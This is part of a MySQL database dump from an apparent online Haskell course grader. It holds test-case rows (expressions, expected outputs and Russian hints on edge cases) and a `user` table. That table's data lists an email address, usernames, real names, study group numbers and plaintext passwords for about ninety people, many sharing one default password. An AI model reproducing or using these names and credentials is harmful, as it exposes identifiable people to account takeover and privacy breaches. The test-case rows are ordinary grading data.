(153, 'weekendExpences [3,1,4,12,3,5,17,6,7,7,8,18,5,1,3]', '28', 72, 0, 1, ''),
(154, 'take 10 fibs', '[1,1,2,3,5,8,13,21,34,55]', 73, 0, 1, ''),
(155, 'sumPos (Node 3 (Node (-1) Empty Empty) (Node 4 Empty Empty))', '7', 74, 0, 1, ''),
(156, 'perimeter (Circle 0)', '0', 76, 0, 1, ''),
(157, 'perimeter (Rect 3 7)', '20', 76, 0, 2, ''),
(158, 'let x = approxSum [sin i/i | i<-[1..]] in x < 1.1', 'True', 71, 1, 2, 'Последовательность может содержать и отрицательные числа'),
(159, 'length(filter(==[6,3])(take 100 (generalizedCantor 2)))', '1', 66, 0, 2, ''),
(160, 'length (allLists 2 5)', '32', 56, 0, 4, ''),
(161, 'canMakeScheme [13,2,30,3,7] 6', 'True', 58, 0, 1, ''),
(162, 'canMakeScheme [13,2,30,3,7] 6', 'True', 57, 0, 7, ''),
(163, 'take 20 sqrt2', '[1,4,1,4,2,1,3,5,6,2,3,7,3,0,9,5,0,4,8,8]', 77, 0, 1, ''),
(164, 'take 6 pascal', '[[1],[1,1],[1,2,1],[1,3,3,1],[1,4,6,4,1],[1,5,10,10,5,1]]', 78, 0, 1, ''),
(165, 'canMakeScheme [13,2,10] 30', 'False', 57, 0, 8, ''),
(166, 'sqrt2 !! 98', '7', 77, 0, 2, ''),
(167, 'sqrt2 !! 99', '2', 77, 0, 3, ''),
(168, 'sumPos (Node (-5) (Node 2 Empty Empty) Empty)', '2', 74, 0, 2, ''),
(169, 'take 15 lst239', '[2,3,9,22,23,29,32,33,39,92,93,99,222,223,229]', 81, 0, 1, ''),
(170, 'countDifferentVars [([''x''],[''y''])] [[''x'']]', '1', 82, 0, 1, ''),
(171, 'countDifferentVars [(1,3),(2,3)] [1,4,2,3,1]', '2', 82, 0, 2, ''),
(173, 'countDifferentVars [(1,2),(2,3), (4,5)] [1,7,2,3,1,4,5]', '3', 82, 0, 3, ''),
(174, 'countDifferentVars [(1,3),(2,3), (3,4)] [1,2,3,1,4,5,6]', '3', 82, 0, 4, ''),
(175, 'countDifferentVars [(1,2),(2,1)] [1,2,3]', '2', 82, 0, 5, ''),
(176, 'countDifferentVars [] [1,2,3]', '3', 82, 1, 6, 'Списки могут быть и пустыми..'),
(177, 'countDifferentVars [(1,2),(2,3), (4,5)] []', '0', 82, 1, 7, 'Списки могут быть и пустыми..'),
(178, 'length(filter(==[4,1,1])(take 100 (generalizedCantor 5)))', '1', 66, 0, 3, ''),
(179, 'countDifferentVars [(1,2),(2,1),(2,1)] [1,2,3]', '2', 82, 0, 8, ''),
(180, 'countDifferentVars [(1,3),(3,2),(2,1),(8,9)] [1,2,3,4,8,9]', '3', 82, 0, 9, ''),
(181, 'countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]', '1', 82, 0, 10, ''),
(182, 'Rat 1 2 + Rat 1 7', '9/14', 85, 0, 1, ''),
(183, 'Rat 1 3 < Rat 4 5', 'True', 85, 0, 2, ''),
(184, 'Rat 1 (-3) < Rat 4 5', 'True', 85, 1, 3, 'Числа ведь могут быть и отрицательными...'),
(185, 'allNondivisible [2, 7, 6, 5]', 'False', 86, 0, 1, ''),
(186, 'allNondivisible [4, 7, 6, 5]', 'True', 86, 0, 2, ''),
(187, 'eval (Add (N 3) (Mult X X)) 10', '103', 87, 0, 1, ''),
(188, 'diff (Mult X X)', 'Add (Mult (N 1) X) (Mult X (N 1))', 88, 0, 1, ''),
(189, 'flatten (Node 1 (Node 2 Empty Empty) (Node 3 Empty Empty))', '[1,2,3]', 89, 0, 1, ''),
(190, 'merge [1,4,8] [2,4,5,10,20]', '[1,2,4,5,8,10,20]', 91, 0, 1, ''),
(191, 'allNondivisible [4,2]', 'False', 86, 0, 3, 'Делимость - это '),
(192, 'take 10 ham', '[1,3,9,10,27,30,81,90,100,243]', 93, 0, 1, ''),
(193, 'ham !! 5000', '218700000000000000000000000000000000000000000000000000000000000000000', 93, 0, 2, ''),
(194, 'countDifferentVars [(1,2),(1,5),(3,4),(4,5)] [1..4]', '1', 82, 0, 11, ''),
(195, 'checkBrackets [''('',''['','']'','')'']', 'True', 97, 0, 1, ''),
(196, 'checkBrackets [''('',''['','')'','']'']', 'False', 97, 0, 2, ''),
(197, 'checkBrackets [''('',''['','']'']', 'False', 97, 0, 3, ''),
(198, 'checkBrackets [''('',''['','']'','')'','')'']', 'False', 97, 0, 4, ''),
(199, 'fromStr(toStr (Node ''a'' (Node ''b'' Empty Empty) Empty))', 'Node ''a'' (Node ''b'' Empty Empty) Empty', 98, 0, 1, ''),
(200, 'checkBrackets [''('','')'',''['','']'']', 'True', 97, 0, 5, ''),
(201, 'checkBrackets [''('',''('']', 'False', 97, 0, 6, ''),
(202, 'countDifferentVars [(1,2),(2,3),(4,5),(1,4)] [1,2,3,4]', '1', 82, 0, 12, ''),
(203, 'fromStr(toStr(Node ''a'' (Node ''b''  Empty Empty) (Node ''b''  Empty Empty) ))', 'Node ''a'' (Node ''b'' Empty Empty) (Node ''b'' Empty Empty)', 98, 0, 2, ''),
(204, 'merge [1,2] [3,4]', '[1,2,3,4]', 91, 0, 2, ''),
(205, 'length (allDiffLists 3 3)', '6', 100, 0, 1, ''),
(206, 'simplify (Mult X (Mult X (N 0)))', 'N 0', 101, 0, 1, ''),
(207, 'findMajor [2,3,15,2,2,2]', 'Just 15', 102, 0, 1, ''),
(208, 'findMajor [2,3,5,2,4]', 'Nothing', 102, 0, 2, ''),
(209, 'findInLists [[1,2], [2,8,7]] (>5) 0', '8', 103, 0, 1, ''),
(210, 'findInLists [[1,8,2], [2,7]] (>10) 0', '0', 103, 0, 2, ''),
(211, 'doubleEven [1,2,6,3]', '[1,2,2,6,6,3]', 104, 0, 1, ''),
(212, 'cartesian [1,2] [3,4]', '[(1,3),(1,4),(2,3),(2,4)]', 105, 0, 1, ''),
(213, 'simplify (Mult X X)', 'Mult X X', 101, 0, 2, ''),
(214, 'checkBrackets ['')'',''('']', 'False', 97, 0, 7, ''),
(215, 'checkBrackets [''['',''('','')'',''('','']'','')'']', 'False', 97, 0, 8, ''),
(216, 'findMajor [1,2,3,2,2,2,1]', 'Just 2', 106, 0, 1, ''),
(217, 'findMajor [1,2,3,2,1]', 'Nothing', 106, 0, 2, ''),
(218, 'findMajor [1,2]', 'Nothing', 106, 0, 3, ''),
(219, 'Or X (Not X) == T', 'True', 107, 0, 1, ''),
(220, 'Or X (And X (Not X)) == T', 'False', 107, 0, 2, ''),
(221, 'length(queens 3 2)', '2', 108, 0, 1, ''),
(222, 'length (queens 4 4)', '2', 108, 0, 2, ''),
(223, 'length (queens 8 8)', '92', 108, 0, 3, ''),
(224, 'eval (Add (Var [''x'']) (Mult (Var [''y'']) (N 3))) [([''x''], 5), ([''y''], 8)]', '29', 111, 0, 1, ''),
(225, 'eval (Let [''x''] 10 (Mult (Var [''x'']) (Var [''y'']))) [([''y''], 2)]', '20', 112, 0, 1, ''),
(226, 'sum_cps [1,2,3] (^2)', '36', 113, 0, 1, ''),
(227, 'triangle1 3', '[1,1,2,1,2,3]', 114, 0, 1, ''),
(228, 'triangle2 3', '[1,1,2,1,2,3]', 114, 0, 2, ''),
(229, 'triangle2 1', '[1]', 114, 0, 3, ''),
(230, 'f [7, 6, 4, 3, 20, 15, 9] ', '[30]', 115, 0, 1, ''),
(234, 'let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]', '(20,[25,2])', 118, 0, 1, ''),
(233, 'let c3 f x = f (f x) in toInt (inc c3)', '3', 117, 0, 2, ''),
(235, 'let c3 f x = f (f (f x)) in toInt c3', '3', 116, 0, 1, ''),
(236, 'let c3 f x = f (f (f x)) in toInt (inc c3)', '4', 117, 0, 3, ''),
(237, 'let three f x = f (f (f x)) in toInt (dec three)', '2', 119, 0, 1, ''),
(238, 'eval (Let [''x''] 10 (Mult (Var [''x'']) (Var [''y'']))) [([''x''], 0),([''y''], 2)]', '20', 112, 0, 2, ''),
(239, 'checkBrackets [''['',''['','']'','']'']', 'True', 97, 0, 9, ''),
(240, 'findMajor [3,3,1,2,1,2,1,3,3]', 'Nothing', 106, 0, 4, ''),
(241, 'f [7, 6, 4, 3, 20, 15, 9] ', 'Just 30', 123, 0, 1, ''),
(242, 'f [7, 6, 4, 3, 9]', 'Nothing', 123, 0, 2, ''),
(243, 'eval (LetFunc [''F''] [''X''] (Var [''X'']) (Call [''F''] (Num 5))) [] []', '5', 122, 0, 1, ''),
(244, 'Not X == Not X', 'True', 107, 0, 3, ''),
(245, 'Not X == X', 'False', 107, 0, 4, ''),
(246, 'And (Or X X) (Not X) == Not X', 'False', 107, 0, 5, ''),
(247, 'F == X', 'False', 107, 0, 6, ''),
(248, 'eval (LetFunc "F" "X" (Mult (Var "X") (Var "X")) (Call "F" (Add (Num 1) (Num 1)))) [] []', '4', 122, 0, 2, '');

-- --------------------------------------------------------

--
-- Структура таблицы `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `UserID` varchar(32) NOT NULL,
  `Password` varchar(32) NOT NULL,
  `Name` varchar(30) NOT NULL,
  `Surname` varchar(30) NOT NULL,
  `RoleID` int(11) NOT NULL DEFAULT '1',
  `GroupNumber` int(11) DEFAULT NULL,
  PRIMARY KEY (`UserID`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Дамп данных таблицы `user`
--

INSERT INTO `user` (`UserID`, `Password`, `Name`, `Surname`, `RoleID`, `GroupNumber`) VALUES
('alexey.solovyew@gmail.com', 'Phoenix', 'Alexey', 'Solovyew', 1, 541),
('msimuni', '12345', 'Michael', 'Simuni', 2, NULL),
('1705225', 'haloween', 'Александр', '', 1, 0),
('1032586', 'haloween', 'Мэтью', '', 1, 0),
('2024482', 'haloween', 'Михаил', 'Парахин', 1, 543),
('893912', 'haloween', 'Оксана', '', 1, 0),
('2898280', 'haloween', 'Аня', '', 1, 0),
('517309', '', 'М', 'С', 1, 1111),
('397095', 'haloween', 'Артём', 'Григорьев', 1, 545),
('63706456', 'haloween', 'Андрей', 'Вяткин', 1, 542),
('57458603', 'haloween', 'Луи', '', 1, 0),
('1730564', 'haloween', 'Maxim', 'Mukosey', 1, 541),
('1384577', 'haloween', 'Богдан', 'Кудрин', 1, 541),
('sleep', '18620', 'Maxim', 'Mukosey', 1, 541),
('erwert', 'kf,elf', 'Александр', 'Голубев', 1, 543),
('6774563', 'haloween', 'Дмитрий', 'Мордвинов', 1, 545),
('Deutsche', 'KeineLust', 'Павел', 'Чистяков', 1, 543),
('182654401', 'haloween', 'Павел', 'Чистяков', 1, 543),
('44060', 'haloween', 'Надежда', 'Чижова', 1, 545),
('318210', 'haloween', 'Руслан', 'Мокаев', 1, 545),
('472848', 'haloween', 'Коля', 'Петров', 1, 445),
('985727', 'haloween', 'Юрий', 'Коноплев', 1, 545),
('787463', 'haloween', 'Vladimir', 'Polyakov', 1, 545),
('419046', 'haloween', 'Нелли', 'Снарская', 1, 542),
('B@rmaley.exe', 'geotemp', 'Артём', 'Соболев', 1, 344),
('177349145', 'haloween', 'Каллиопа', '', 1, 0),
('2562137', 'haloween', 'Sergey', 'Serebryakov', 1, 545),
('550896', 'haloween', 'Светлана', '', 1, 0),
('51559263', 'haloween', 'Никита', 'Барт', 1, 541),
('dmitry', 'dmitry', 'dmitry', 'dmitry', 1, 443),
('12206137', 'haloween', 'Дмитрий', 'Авдюхин', 1, 545),
('2118411', 'haloween', 'Валерий', 'Петров', 1, 543),
('4169333', 'haloween', 'Диметрио', 'Сергеев', 1, 541),
('2223305', 'haloween', 'Евгений', '', 1, 0),
('hasp', '753357derparol', 'Дмитрий', 'Найданов', 1, 545),
('2194390', 'haloween', 'Юрий', '', 1, 0),
('374969', '123456', 'Александр', 'Астащенко', 1, 545),
('4677767', 'haloween', 'Павел', '', 1, 0),
('97440347', 'haloween', 'Миша', '', 1, 0),
('471091', 'haloween', 'Darya', '', 1, 0),
('dandelio', 'G0k3BEQx', 'П', 'Р', 1, 111),
('171981', 'haloween', 'Станислав', '', 1, 0),
('Boby', 'Bousher3!@', 'Дмитрий', 'Фомушкин', 1, 542),
('5656962', 'haloween', 'Марина', 'Перевалова', 1, 545),
('42791920', 'haloween', 'Alexey', '', 1, 0),
('3742311', 'haloween', 'Вадим', 'Тайц', 1, 541),
('3431532', 'haloween', 'Alexey', 'Kretov', 1, 542),
('tonyo', ',ehfnj112hedin', 'Антон', 'Овчинников', 1, 545),
('442421', 'haloween', 'Вадим', 'Белотицкий', 1, 541),
('83813', 'haloween', 'Валентин', 'Фондаратов', 1, 541),
('383483', 'haloween', 'Екатерина', 'Бойкова', 1, 541),
('214982', 'haloween', 'Антон', 'Беляев', 1, 541),
('116474071', 'haloween', 'Margaret', '', 1, 0),
('14561781', 'haloween', 'Irina', '', 1, 0),
('sromanov', '123123', 'Сергей', 'Романов', 1, 545),
('528420', 'haloween', 'Аня', 'Позднякова', 1, 541),
('4748987', 'haloween', 'Ekaterina', '', 1, 0),
('17107004', 'haloween', 'Anton', 'Kozlvo', 1, 545),
('4837959', 'haloween', 'Паўлюк', '', 1, 0),
('533223', 'haloween', 'Ваня', 'Меженько', 1, 542),
('82873297', 'haloween', 'Михаил', 'Старчак', 1, 541),
('1106603', 'haloween', 'Irina', '', 1, 0),
('16265158', 'haloween', 'Fedor', '', 1, 0),
('9539826', 'haloween', 'Виктор', 'Фефилов', 1, 542),
('419892', 'haloween', 'Алексей', '', 1, 0),
('5477377', 'haloween', 'Екатерина', '', 1, 0),
('577053', 'haloween', 'Андрей', '', 1, 0),
('532002', 'haloween', 'Дмитрий', 'Копин', 1, 0),
('jamesbrain', 'mrlamo', 'Роман', 'Шеин', 1, 545),
('1029771', 'haloween', 'Никита', 'Соловцов', 1, 542),
('355679', 'haloween', 'Иннокентий', 'Шувалов', 1, 545),
('1205224', 'haloween', 'Михаил', '', 1, 0),
('code', 'fox888', 'Alexander', 'Golosenko', 1, 545),
('3476675', 'haloween', 'Александр', '', 1, 0),
('5772638', 'haloween', 'Мария', 'Виденеева', 1, 542),
('3607492', 'haloween', 'Данила', 'Гусев', 1, 543),
('80387804', 'haloween', 'Давид', '', 1, 0),
('554681', 'haloween', 'Амир', '', 1, 0),
('Маргарита Нурмухаметова', '6uueazsy', 'Маргарита', 'Нурмухаметова', 1, 543),
('329842', 'haloween', 'Всеволод', 'Иванов', 1, 545),
('artyushov', 'kolomyaganikita', 'Никита', 'Артюшов', 1, 542),
('239817', 'haloween', 'Ольга', '', 1, 0),
('1640763', 'haloween', 'Дмитрий', '', 1, 0),
('jogrms', 'zsefbhuk', 'Иван', 'Бабушкин', 1, 542),
('4818', 'haloween', 'Александр', '', 1, 0),
('lexa411', '041191144', 'Алексей', 'Фефелов', 1, 545),
('4559721', 'haloween', 'Мира', '', 1, 0),
('41733365', 'haloween', 'Саня', '', 1, 0),
('132727093', 'haloween', 'Александр', '', 1, 0),
('938889', 'haloween', 'Nikolay', '', 1, 0);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
